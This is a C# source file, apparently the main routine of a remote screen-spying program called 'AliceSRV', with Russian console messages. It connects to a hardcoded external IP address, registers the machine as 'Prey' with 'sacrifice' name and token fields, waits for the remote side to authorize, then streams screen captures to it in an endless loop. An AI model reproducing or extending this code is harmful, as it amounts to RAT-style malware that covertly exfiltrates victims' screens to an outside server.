using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Net;

namespace AliceSRV
{
    class Program
    {
        static void Main(string[] args)
        {
            //byte[] t = new byte[2];
            //t = BitConverter.GetBytes((int)259);

          

            Prey _My;
            Connection server1 = new Connection("46.173.208.70", 19999);//("195.128.124.171", 19999);
            if (server1.isConnect)
            {
                _My = new Prey(server1);
                Console.WriteLine(_My.Name_sacrifice + " " + _My.Token_sacrifice);
                server1._SendPreyOnline(_My);
                Console.WriteLine("Ожидаем команды");
              IPEndPoint ipclient=  Connection._WhaitAutorization(server1);
                // PrtSC.StartPrtSC(server1, ipclient);
                PrtSC.CutInToParts(server1, ipclient);
                while (true)
                {
                    PrtSC.Update(server1, ipclient);
                    Thread.Sleep(100);
                }
            }//ожидаем ответа от клиента

            else
            {
                Console.WriteLine("Сервер недоступен!");
                Console.ReadLine();
            }

            }
                
    }
}
